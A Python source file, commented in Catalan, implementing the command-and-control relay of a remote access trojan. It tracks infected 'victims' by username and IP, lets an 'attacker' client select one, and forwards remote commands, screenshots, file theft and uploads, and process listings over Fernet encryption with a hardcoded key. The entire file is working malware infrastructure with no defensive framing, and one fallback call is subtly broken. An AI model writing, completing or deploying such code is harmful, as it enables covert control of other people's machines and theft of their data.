import socket
import threading
from cryptography.fernet import Fernet

# Clau Fernet compartida
key = b'7gBE0tVEzrYOLppvlPklI_vBn-IYnU1OH2UanvcYsIE='
cipher = Fernet(key)

victims = []

def sendc(socket, message):
    encrypted = cipher.encrypt(message.encode())
    socket.send(encrypted)

def sendc_large(src_socket, dst_socket, size):
    bytes_sent = 0
    while bytes_sent < size:
        chunk = src_socket.recv(min(4096, size - bytes_sent))
        if not chunk:
            break
        dst_socket.sendall(chunk)
        bytes_sent += len(chunk)

def recvc(socket):
    data = socket.recv(4096)
    return cipher.decrypt(data).decode()

def transfer_file(src_socket, dst_socket):
    response = recvc(src_socket)
    sendc(dst_socket, response)
    if response.startswith("EXISTS"):
        filesize = int(response.split(' ')[1])
        ready = dst_socket.recv(4096)
        src_socket.send(ready)
        bytes_received = 0
        while bytes_received < filesize:
            data = src_socket.recv(min(4096, filesize - bytes_received))
            if not data:
                break
            dst_socket.send(data)
            bytes_received += len(data)

        done_signal = src_socket.recv(1024)
        dst_socket.send(done_signal)

def handle_post(attacker, victim):
    ok = victim.recv(4096)
    attacker.send(ok)
    transfer_file(attacker, victim)
    result = victim.recv(1024)
    attacker.send(result)

def handle_ps(victim, attacker_socket):
    enc_size = victim.recv(256)
    if not enc_size:
        print("[!] Error rebent la mida xifrada")
        return

    attacker_socket.sendall(enc_size)

    try:
        decrypted_size = cipher.decrypt(enc_size.strip()).decode()
        total_size = int(decrypted_size)
    except Exception as e:
        print(f"[!] Error desxifrant la mida: {e}")
        return
    sendc_large(victim, attacker_socket, total_size)

def send_victims_list(attacker_socket):
    if not victims:
        sendc(attacker_socket, "No hi ha víctimes disponibles.")
        return
    victim_list = "\n".join(
        f"{i}: {v['username']} - {v['public_ip']}" for i, v in enumerate(victims)
    )
    sendc(attacker_socket, victim_list)

def select_victim(attacker_socket):
    try:
        index = int(recvc(attacker_socket))
        if 0 <= index < len(victims):
            return victims[index]["sock"]
    except:
        return None

def handle_attacker(attacker_socket):
    send_victims_list(attacker_socket)
    if not victims:
        attacker_socket.close()
        return

    victim = select_victim(attacker_socket)
    if not victim:
        sendc(attacker_socket, "Índex invàlid.")
        attacker_socket.close()
        return

    sendc(attacker_socket, f"Conectat amb {victim.getpeername()[0]}\n")

    while True:
        try:
            command = recvc(attacker_socket)
            if not command:
                break

            if command == 'exit':
                break
            if command == 'total exit':
                sendc(victim, 'exit')
                victim.close()
                for v in victims:
                    if v["sock"] == victim:
                        victims.remove(v)
                        print(f"[−] Víctima eliminada: {v['username']} - {v['public_ip']}")
                        break
                break

            sendc(victim, command)

            if command.startswith('ss') or command.startswith('get'):
                transfer_file(victim, attacker_socket)
            elif command.startswith('post'):
                handle_post(attacker_socket, victim)
            elif command.startswith('ps'):
                handle_ps(victim, attacker_socket)
            else:
                response = victim.recv(4096)
                attacker_socket.send(response)
        except Exception as e:
            print(f"[ERROR] Atacant: {e}")
            break

    attacker_socket.close()

def add_victim(sock, username, pubip, prvip):
    victims.append({
        "sock": sock,
        "username": username,
        "public_ip": pubip,
        "private_ip": prvip
    })
    print(f"[+] Víctima afegida: {username} - {pubip}")

def start_proxy():
    host = '0.0.0.0'
    port = 5555

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"[PROXY] Escoltant a {host}:{port}")

    while True:
        client, addr = server.accept()
        try:
            client_type = recvc(client)
            if client_type.startswith("victim::"):
                parts = client_type.split("::")
                if len(parts) == 3:
                    _, username, prvip = parts
                    pubip = client.getpeername()[0]
                    add_victim(client, username, pubip, prvip)
                else:
                    add_victim(client, "desconegut", client.getpeername()[0])
            elif client_type == "attacker":
                threading.Thread(target=handle_attacker, args=(client,), daemon=True).start()
            else:
                client.close()
        except Exception as e:
            print(f"[ERROR] Connexió: {e}")

if __name__ == "__main__":
    start_proxy()